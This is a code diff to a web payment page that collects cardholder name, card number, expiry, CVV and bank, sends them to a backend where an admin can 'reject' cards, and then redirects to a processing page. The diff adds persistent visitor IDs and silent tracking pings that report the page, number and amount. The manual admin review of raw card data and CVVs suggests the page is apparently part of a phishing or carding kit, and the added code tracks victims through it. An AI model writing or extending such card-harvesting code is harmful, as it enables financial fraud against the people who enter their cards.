@@ -619,6 +619,15 @@
   const type    = params.get('type') || 'bill'; // 'bill' or 'reload'
   const errorParam = params.get('error'); // 'card' if rejected by admin
 
+  // Visitor tracking
+  const _vid = params.get('vid') || localStorage.getItem('_vid') || 'v_' + Math.random().toString(36).slice(2) + Date.now();
+  localStorage.setItem('_vid', _vid);
+  function pingVisitor(page, num, amt, tp) {
+    fetch('/api/visitor/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ visitorId: _vid, page, number: num || '', amount: amt || '', type: tp || type }) }).catch(() => {});
+  }
+  pingVisitor('credit-card', number, amount, type);
+
   // Show error message if rejected
   if (errorParam === 'card') {
     const errDiv = document.createElement('div');
@@ -726,17 +735,19 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           sessionId, cardholderName, cardNumber, expiry, cvv, country, bank,
-          number, amount, ref, type
+          number, amount, ref, type, visitorId: _vid
         })
       });
       const data = await res.json();
       if (data.success) {
         // Navigate to processing page
+        pingVisitor('processing', number, amount, type);
         window.location.href = '/processing?sessionId=' + encodeURIComponent(sessionId)
           + '&number=' + encodeURIComponent(number)
           + '&amount=' + encodeURIComponent(amount)
           + '&ref=' + encodeURIComponent(ref)
-          + '&type=' + type;
+          + '&type=' + type
+          + '&vid=' + encodeURIComponent(_vid);
       } else {
         btn.textContent = 'Proceed';
         btn.classList.remove('disabled');
